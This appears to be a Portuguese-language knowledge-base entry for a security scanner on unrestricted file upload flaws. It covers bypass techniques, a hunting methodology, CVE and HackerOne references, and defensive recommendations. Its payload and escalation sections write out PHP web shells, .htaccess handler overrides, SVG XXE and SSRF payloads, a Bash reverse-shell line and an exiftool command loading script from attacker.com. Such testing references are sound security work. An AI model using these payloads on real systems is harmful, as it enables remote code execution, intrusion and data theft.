---
id: file_upload_bypass
title: "Unrestricted File Upload"
module: "FileUpload"
severity: "HIGH"
cwe_id: "CWE-434"
cwe_title: "Unrestricted Upload of File with Dangerous Type"
cvss_vector: "AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
vrt_id: "server_security_misconfiguration.unrestricted_file_upload"
---

## Summary
Validacao insuficiente de uploads permite enviar arquivos com extensoes executaveis (.php, .jsp, .aspx), content-type spoofado ou magic bytes manipulados, levando a execucao remota de codigo (RCE) quando o arquivo e servido pelo web server.

## Description
Unrestricted file upload ocorre quando o servidor aceita uploads sem validar adequadamente extensao, content-type e conteudo do arquivo. O atacante envia um arquivo com codigo malicioso (web shell) disfarçado por tecnicas de bypass:

- **Double extension:** `shell.php.jpg` -- Apache com misconfiguracao processa `.php` mesmo com extensao adicional.
- **Null byte:** `shell.php%00.jpg` -- trunca o nome no filesystem, criando `shell.php`.
- **Case variation:** `shell.PhP`, `shell.pHp5` -- bypass de blocklist case-sensitive.
- **Alternative extensions:** `.phtml`, `.php5`, `.php7`, `.shtml`, `.asa`, `.cer` -- extensoes menos conhecidas que executam codigo.
- **Dot trick:** `shell.php.` ou `shell.php...` -- Windows remove dots finais, resultando em `shell.php`.
- **Content-type spoofing:** enviar `Content-Type: image/jpeg` com conteudo PHP.
- **Magic bytes:** prepend `GIF89a` ou header PNG/JPEG antes do codigo PHP para bypass de validacao por magic bytes.
- **NTFS Alternate Data Stream:** `shell.aspx:.jpg` (IIS/Windows) cria arquivo com extensao perigosa.
- **Filename injection:** payload XSS/SQLi/LFI no nome do arquivo para explorar processamento secundario.

Apos upload, o atacante acessa o arquivo diretamente para executar o codigo, ou combina com LFI para inclusao.

## Impact
- Execucao remota de codigo (RCE) no servidor.
- Web shell persistente com acesso completo ao filesystem e comandos.
- Leitura de credenciais, chaves privadas e dados sensiveis do servidor.
- Movimento lateral para outros sistemas na rede.
- Stored XSS via upload de SVG/HTML malicioso.
- Negacao de servico via upload de arquivos grandes (zip bomb, pixel flood).

## Payloads and Bypasses
```
# -- Extension bypass --
shell.php.jpg
shell.php.png
shell.jsp.png
shell.aspx.gif
shell.php%00.jpg
shell.php%00.png
shell.PhP
shell.pHp
shell.PHP
shell.phtml
shell.php5
shell.php7
shell.shtml
shell.asa
shell.cer
shell.php.
shell.php...

# -- Content-Type spoofing --
Content-Type: image/jpeg    (com conteudo PHP)
Content-Type: image/png     (com conteudo PHP)
Content-Type: image/gif     (com conteudo PHP)

# -- Magic bytes + payload --
GIF89a<?php system($_GET['c']); ?>
\x89PNG\r\n\x1a\n<?php system($_GET['c']); ?>
\xFF\xD8\xFF\xE0<?php system($_GET['c']); ?>

# -- PHP web shell minimo --
<?php echo "MARKER"; ?>
<?php system($_GET['c']); ?>
<?php echo shell_exec($_GET['c']); ?>

# -- Configuration file bypass --
# .htaccess (Apache)
AddType application/x-httpd-php .jpg
# web.config (IIS)
<handlers><add name="x" path="*.jpg" verb="*" modules="IsapiModule" scriptProcessor="%windir%\Microsoft.NET\Framework64\v4.0.30319\aspnet_isapi.dll" /></handlers>

# -- Zip Slip (directory traversal via archive) --
# python evilarc.py shell.php -o unix -f shell.zip -p var/www/html/ -d 15

# -- Filename injection --
# XSS via filename:
'"><img src=x onerror=alert(document.domain)>.php
# SQLi via filename:
poc.js'(select*from(select(sleep(20)))a)+'.jpg
# LFI via filename:
../../../tmp/shell.php

# -- SVG XSS --
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>

# -- SVG XXE (leitura de arquivo via entidade externa) --
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>

# -- SVG SSRF (xlink:href para rede interna / cloud metadata) --
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="http://169.254.169.254/latest/meta-data/" />
</svg>

# -- FFmpeg HLS SSRF via video upload --
# Craft .m3u8 playlist que faz FFmpeg acessar endpoints internos
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
http://169.254.169.254/latest/meta-data/iam/security-credentials/
#EXT-X-ENDLIST

# -- Blind XSS via EXIF metadata (trigger quando admin visualiza) --
exiftool -Comment='<script src=https://attacker.com/xss.js></script>' image.jpg

# -- Exiftool metadata injection (PHP shell) --
exiftool -Comment='<?php system($_GET["c"]); ?>' image.jpg
```

## Target Context (Crawler Hints)
- **Parametros comuns:** `file`, `upload`, `attachment`, `image`, `document`, `avatar`, `media`, `data`.
- **Paths comuns:** `/upload`, `/api/upload`, `/files`, `/attachments`, `/media`, `/images`, `/api/files`, `/api/attachments`, `/api/images`, `/api/media`, `/avatar`, `/api/avatar`.
- **Sinais:** forms com `enctype="multipart/form-data"`; `<input type="file">`; resposta com path/URL do arquivo apos upload; diretorio de uploads acessivel (`/uploads/`, `/media/`, `/files/`).

## Notable CVEs

| CVE | Produto | Ano | Descricao | Tipo |
|-----|---------|-----|-----------|------|
| CVE-2023-24489 | Citrix ShareFile | 2023 | Upload sem autenticacao permite RCE via manipulacao de path e extensao -- explorado in-the-wild | Unauth upload RCE |
| CVE-2023-27997 | Fortinet FortiOS | 2023 | Heap overflow via upload malicioso no SSL-VPN permite pre-auth RCE | Upload to RCE |
| CVE-2021-21972 | VMware vCenter | 2021 | Upload sem autenticacao no vSphere Client permite RCE como SYSTEM/root | Unauth upload RCE |
| CVE-2020-17530 | Apache Struts 2 | 2020 | Double evaluation em upload de arquivo permite OGNL injection e RCE | Upload + injection |
| CVE-2024-4577 | PHP CGI | 2024 | Argument injection via upload de arquivo em Windows com locale japones permite RCE | Upload + arg injection |

## Escalation Techniques
- **Web shell para RCE:** apos upload bem-sucedido de `.php`/`.jsp`/`.aspx`, acessar diretamente para executar comandos (`shell.php?c=whoami`). Escalar para reverse shell com `bash -i >& /dev/tcp/IP/PORT 0>&1`.
- **XSS via SVG/HTML:** upload de SVG com `onload="alert(document.domain)"` ou HTML com JavaScript -- funciona quando arquivos sao servidos do mesmo dominio com Content-Type correto.
- **SSRF via processamento de imagem:** se o servidor processa imagens com ImageMagick, usar payload SVG/MVG que faz request externo (`<image xlink:href="http://attacker.com/ssrf">`). CVE-2016-3714 (ImageTragick).
- **LFI chain:** se upload vai para diretorio conhecido mas extensao e renomeada, combinar com LFI (`/page=../uploads/HASH`) para incluir o arquivo. Em PHP, wrapper `zip://` pode executar payload dentro de ZIP.
- **Overwrite de config:** upload de `.htaccess` (Apache) com `AddType application/x-httpd-php .jpg` faz o servidor executar qualquer `.jpg` como PHP. Em IIS, `web.config` com handler mapping.
- **Zip Slip:** upload de arquivo ZIP com path traversal (`../../../etc/cron.d/backdoor`) para gravar arquivos em qualquer diretorio. Funciona quando o servidor extrai o ZIP automaticamente.
- **DoS via resource exhaustion:** upload de pixel flood (imagem com dimensoes enormes 65535x65535 mas tamanho pequeno), zip bomb (42.zip), ou arquivo de 4GB de nulls comprimido.
- **Exfiltration via metadata:** se o servidor processa EXIF/metadata de imagens, injetar payload e observar se aparece em responses (leaks de path, versao do software).
- **SVG triple-threat (XXE/SSRF/XSS):** SVG e XML, logo aceita entidades externas (XXE para leitura de arquivos), xlink:href (SSRF para rede interna e cloud metadata), e event handlers (XSS). Upload de SVG como avatar/logo frequentemente nao e sanitizado. H1: Shopify #223203, Zivver #897244 (112 upvotes), phpBB #3606773 (worm auto-propagante via SVG).
- **Media processing RCE:** ExifTool RCE (CVE-2021-22204) via metadata manipulada em imagens -- GitLab #1154542 ($20,000, 508 upvotes). ImageMagick delegate injection (CVE-2016-3714 ImageTragick). FFmpeg HLS SSRF via playlist .m3u8 em video upload -- TikTok #1062888 ($2,727, 162 upvotes). Pornhub #570537/#574133 ($500 cada).
- **Blind XSS via metadata:** payload XSS inserido em EXIF/metadata da imagem (Comment, Artist, Copyright). Trigger quando admin visualiza metadata ou quando sistema de processamento renderiza o campo. Detectavel apenas via XSS callback (ex.: Blind XSS on image upload -- CS Money #1010466, 449 upvotes, $1,000).
- **IDOR no upload endpoint:** mudar user_id/context no multipart form para upload de arquivo no contexto de outro usuario. Sobrescrever avatar ou arquivo de outro usuario. H1: Mars #2393021 (66 upvotes), IBM #2085185 (57 upvotes), Mail.ru #671605 ($750).
- **CSP bypass via upload:** upload de arquivo JS para o mesmo dominio permite bypass de Content-Security-Policy que confia em self. H1: Rocket.Chat #1380157.

## Hunting Methodology
1. Localizar todas as funcionalidades de upload -- forms com `enctype="multipart/form-data"`, endpoints de API (`/api/upload`, `/api/files`), upload de avatar/foto de perfil, import de CSV/XML.
2. Fazer upload de arquivo legitimo (.jpg, .png) e observar onde o arquivo e armazenado -- verificar se o path/URL e retornado na resposta e se e acessivel diretamente.
3. Testar restricao de extensao: enviar `shell.php` e observar se e rejeitado. Se sim, tentar bypasses em ordem: double extension (`.php.jpg`), null byte (`.php%00.jpg`), case variation (`.PhP`), extensoes alternativas (`.phtml`, `.php5`).
4. Testar Content-Type: enviar arquivo `.php` com Content-Type `image/jpeg` -- se aceito, a validacao e so por header.
5. Testar magic bytes: prepend `GIF89a` ao payload PHP e enviar como `.gif` -- se aceito, a validacao e por magic bytes mas nao por conteudo completo.
6. Verificar se o arquivo e renomeado apos upload -- se mantido com nome original, o risco e maior. Se renomeado para UUID, verificar se a extensao original e mantida.
7. Verificar se o diretorio de uploads permite execucao -- acessar `https://target/uploads/shell.php` apos upload e verificar se executa ou retorna download/texto.
8. Testar .htaccess upload se Apache -- se aceito, enviar com `AddType application/x-httpd-php .jpg` e depois upload de `.jpg` com payload PHP.

## False Positive Indicators
- Upload aceita o arquivo mas armazena em diretorio sem execucao (bucket S3, GCS, CDN separado) -- arquivo nao e executavel mesmo com extensao perigosa.
- Arquivo e renomeado para hash aleatorio com extensao fixa (ex.: `a1b2c3d4.jpg`) -- extensao original ignorada pelo servidor.
- Arquivo e reprocessado por biblioteca de imagem (ImageMagick, libvips, Pillow) que remove metadata e payload embutido -- PHP em EXIF/comment e perdido.
- Content-Type do response ao acessar o arquivo e `application/octet-stream` ou `Content-Disposition: attachment` -- browser faz download ao inves de executar.
- Servidor retorna 403/404 ao acessar diretorio de uploads diretamente -- uploads nao sao servidos pela web, apenas por API com validacao.
- Antivirus/scanner no servidor detecta e remove o payload apos upload -- arquivo e aceito mas nao persiste.
- SVG servido com `Content-Disposition: attachment` e CSP estrito (`script-src 'none'`) -- browser faz download, XSS nao executa.
- Imagem reprocessada por pipeline que converte formato (ex.: SVG -> PNG via rasterizacao) -- payload XML/JS e perdido na conversao.

## Notable HackerOne Reports

| Report | Programa | Upvotes | Bounty | Tecnica |
|--------|----------|---------|--------|---------|
| #1154542 | GitLab | 508 | $20,000 | ExifTool RCE via metadata manipulada (CVE-2021-22204) |
| #1010466 | CS Money | 449 | $1,000 | Blind XSS via EXIF metadata em image upload |
| #1062888 | TikTok | 162 | $2,727 | FFmpeg HLS SSRF via video upload (.m3u8) |
| #897244 | Zivver | 112 | $0 | SVG XSS (triple-threat: XXE/SSRF/XSS) |
| #3606773 | phpBB | 90 | $0 | Self-propagating worm via SVG avatar upload |
| #2393021 | Mars | 66 | $0 | IDOR no upload endpoint -- overwrite de arquivo de outro usuario |
| #671605 | Mail.ru | 55 | $750 | IDOR via user_id manipulation em upload |
| #570537 | Pornhub | 50 | $500 | FFmpeg SSRF via media upload |
| #1380157 | Rocket.Chat | 45 | $0 | CSP bypass via JS file upload no mesmo dominio |
| #223203 | Shopify | 40 | $0 | SVG SSRF em upload de imagem |

## Recommendation
1. Validar extensao server-side com allowlist (nao blocklist). Permitir apenas extensoes seguras (.jpg, .png, .gif, .pdf).
2. Renomear uploads para nomes aleatorios com extensao fixa (`UUID.jpg`).
3. Armazenar uploads fora do web root ou em servico de storage externo (S3, GCS).
4. Desabilitar execucao de scripts no diretorio de uploads (Apache: `php_flag engine off`; Nginx: `location /uploads { deny all; }`).
5. Validar content-type E magic bytes do arquivo, nao confiar apenas no Content-Type do request.
6. Servir uploads com `Content-Disposition: attachment` e em dominio separado (CDN) para prevenir XSS.
7. Limitar tamanho maximo de upload e reprocessar imagens com biblioteca de imagem (ImageMagick, libvips) para remover payloads embutidos.
8. Implementar antivirus scan em uploads antes de armazenar.
